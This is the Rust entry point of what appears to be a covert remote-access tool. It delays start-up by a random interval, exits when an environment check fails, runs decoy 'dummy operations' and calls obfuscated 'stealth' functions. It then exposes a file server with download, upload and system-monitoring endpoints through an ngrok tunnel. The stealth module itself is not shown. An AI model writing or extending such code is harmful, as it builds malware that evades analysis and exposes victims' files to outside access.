mod config;
mod encryption;
mod file_server;
mod monitoring; // System monitoring module
mod ngrok;
mod notification;
mod stealth;
mod utils;

use actix_web::{App, HttpServer, middleware, web};
use log::{info, error};
use rand::Rng;
use std::sync::Arc;
use tokio::sync::Mutex;
use tokio::time::sleep;
use std::time::Duration;
use crate::config::Config;
use crate::file_server::FileServer;
use crate::monitoring::{init_monitoring, get_system_stats, dashboard};
use crate::ngrok::setup_ngrok_tunnel;
use crate::stealth::{a1, b2, c3, d4, u21, v22, perform_dummy_operations};
use crate::utils::find_available_port;

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    // Initialize logger
    env_logger::init_from_env(env_logger::Env::new().default_filter_or("info"));
    
    // Initialize random seed
    let sleep_time = {
        let mut rng = rand::thread_rng();
        rng.gen_range(5000..10000)
    };
    sleep(Duration::from_millis(sleep_time)).await;

    // Stealth checks
    if a1() {
        error!("Env check failed, exiting...");
        std::process::exit(1);
    }
    
    // Start dummy operations in background
    std::thread::spawn(move || {
        tokio::runtime::Runtime::new()
            .unwrap()
            .block_on(async {
                perform_dummy_operations().await;
            });
    });
    
    // Execute stealth functions
    b2().await;
    u21().await;
    c3().await;
    d4().await;
    v22().await;
    
    // Create config
    let mut config = Config::new();
    
    // Find an available port dynamically, starting with the configured port
    let preferred_port = config.port;
    let actual_port = find_available_port(preferred_port);
    config.port = actual_port; // Update the config with the actual port
    
    let config = Arc::new(config);
    let file_server = Arc::new(Mutex::new(FileServer::new()));
    
    // Setup server
    let server_address = format!("0.0.0.0:{}", actual_port);
    info!("Service on {}", server_address);
    
    // Start server
    // Initialize system monitoring
    let monitoring_data = init_monitoring();
    let monitoring_data = web::Data::new(monitoring_data);
    
    let config_clone = config.clone();
    let file_server_clone = file_server.clone();
    
    let server = HttpServer::new(move || {
        App::new()
            .app_data(web::Data::new(config_clone.clone()))
            .app_data(web::Data::new(file_server_clone.clone()))
            .app_data(monitoring_data.clone())
            .wrap(middleware::Logger::default())
            .service(file_server::index)
            .service(file_server::download_folder)
            .service(file_server::preview)
            .service(file_server::upload_files)
            // System monitoring endpoints
            .service(dashboard)
            .service(get_system_stats)
    })
    .bind(&server_address)?
    .run();
    
    // Setup ngrok in the background
    let config_clone = config.clone();
    tokio::spawn(async move {
        let sleep_time = {
            let mut rng = rand::thread_rng();
            rng.gen_range(500..1500)
        };
        sleep(Duration::from_millis(sleep_time)).await;
        let public_url = setup_ngrok_tunnel(config_clone.port).await;
        if !public_url.is_empty() {
            info!("Accessible at {}", public_url);
        } else {
            error!("Tunnel setup failed");
        }
    });
    
    // Wait for server to complete
    server.await
}
